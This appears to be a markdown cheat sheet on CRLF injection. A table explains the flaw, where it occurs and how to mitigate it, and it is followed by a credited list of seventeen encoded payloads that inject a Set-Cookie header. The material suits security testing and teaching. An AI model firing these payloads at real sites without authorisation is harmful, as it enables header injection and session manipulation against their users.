### **CRLF Injection**

| **Aspect**                   | **Details**                                                                                                                                           |
|------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Description**              | CRLF Injection (Carriage Return Line Feed) is a type of vulnerability where an attacker inserts unexpected carriage return (CR, `%0d`) and line feed (LF, `%0a`) characters into input fields. This can lead to HTTP response splitting, which might result in security flaws like cross-site scripting, header injection, or cache poisoning. |
| **Conditions to be Vulnerable** | - User input is not sanitized and is directly included in HTTP headers or responses. <br> - Application allows injection of `%0d` and `%0a` characters in unsanitized input. |
| **Where to Find**            | - URL parameters or query strings included in HTTP headers. <br> - User-supplied data reflected in HTTP responses, especially in headers like `Set-Cookie`. |
| **Common Exploits**          | - **HTTP Response Splitting**: Attacker adds `%0d%0a` to split the HTTP response into multiple responses, which can be used to inject headers or malicious content. <br> - **Header Injection**: Attackers inject headers, such as `Set-Cookie`, allowing them to control or manipulate user sessions. |
| **Example**                  | A URL containing `%0d%0aSet-Cookie: session=attacker` can lead to an injected `Set-Cookie` header, where the server unknowingly adds the attacker's cookie to the response. |
| **Mitigation**               | - **Input Validation**: Ensure user input is properly validated and does not allow control characters like `%0d` and `%0a`. <br> - **Header Encoding**: Encode user inputs before they are included in HTTP headers to prevent injection. <br> - **Security Headers**: Implement secure HTTP headers like `X-Content-Type-Options` and `Content-Security-Policy` to mitigate the impact of injection vulnerabilities. |

---

## Pyalods

|Credit Payload |Link|
|---|----|
|zlatanh | https://www.linkedin.com/in/zlatanh/   |

- `/%0a0aSet-Cookie: crlf=injection`
- `/%0aSet-Cookie: crlf=injection`
- `/%0d%0aSet-Cookie: crlf=injection`
- `/%0dSet-Cookie: crlf=injection`
- `/%23%0aSet-Cookie: crlf=injection`
- `/%23%0d%0aSet-Cookie: crlf=injection`
- `/%23%0dSet-Cookie: crlf=injection`
- `/%25%30%61Set-Cookie: crlf=injection`
- `/%25%30aSet-Cookie: crlf=injection`
- `/%250aSet-Cookie: crlf=injection`
- `/%25250aSet-Cookie: crlf=injection`
- `/%2e%2e%2f%0d%0aSet-Cookie: crlf=injection`
- `/%2f%2e%2e%0d%0aSet-Cookie: crlf=injection`
- `/%2F..%0d%0aSet-Cookie: crlf=injection`
- `/%3f%0d%0aSet-Cookie: crlf=injection`
- `/%3f%0dSet-Cookie: crlf=injection`
- `/%u000aSet-Cookie: crlf=injection`
